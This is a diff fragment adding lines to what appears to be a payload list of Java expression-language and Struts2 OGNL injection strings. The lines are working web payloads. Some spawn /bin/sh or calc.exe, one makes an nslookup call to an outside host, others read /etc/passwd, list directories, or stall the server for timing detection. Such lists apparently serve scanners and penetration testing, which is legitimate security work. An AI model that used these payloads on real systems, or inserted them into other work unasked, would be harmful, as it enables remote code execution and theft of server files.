@@ -23,3 +23,8 @@ ${‘a’.getClass().forName(‘javax.script.ScriptEngineManager’).newInstance
 ${“”.getClass().forName(“javax.script.ScriptEngineManager”).newInstance().getEngineByName(“JavaScript”).eval(“new java.lang.ProcessBuilder[‘(java.lang.String[])’]([‘/bin/sh’,’-c’,’nslookup jndi.s.artsploit.com’]).start()”)}
 ${‘a’.getClass().forName(‘javax.script.ScriptEngineManager’).newInstance().getEngineByName(‘JavaScript’).eval(\”new java.lang.ProcessBuilder[‘(java.lang.String[])’]([‘calc.exe’]).start()\”)}
 $\\A{‘’.getClass().forName(‘java.lang.Runtime’).getMethods()[6].invoke(null).exec(‘touch /tmp/cve-2020–10199’)}
+gk6q${“zkz”.toString().replace(“k”, “x”)}doap2
+PRE-${#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#kzxs=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#kzxs.print(#parameters.INJPARAM[0]),#kzxs.print(new java.lang.Integer(829+9)),#kzxs.close(),1?#xx:#request.toString}-POST
+${#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#kzxs=@java.lang.Thread@sleep(10000),1?#xx:#request.toString}
+${#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#wwww=new java.io.File(#parameters.INJPARAM[0]),#pppp=new java.io.FileInputStream(#wwww),#qqqq=new java.lang.Long(#wwww.length()),#tttt=new byte[#qqqq.intValue()],#llll=#pppp.read(#tttt),#pppp.close(),#kzxs=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#kzxs.print(new java.lang.String(#tttt)),#kzxs.close(),1?#xx:#request.toString}&INJPARAM=/etc/passwd
+${#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#wwww=new java.io.File(#parameters.INJPARAM[0]),#pppp=#wwww.listFiles(),#qqqq=@java.util.Arrays@toString(#pppp),#kzxs=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#kzxs.print(#qqqq),#kzxs.close(),1?#xx:#request.toString}&INJPARAM=..
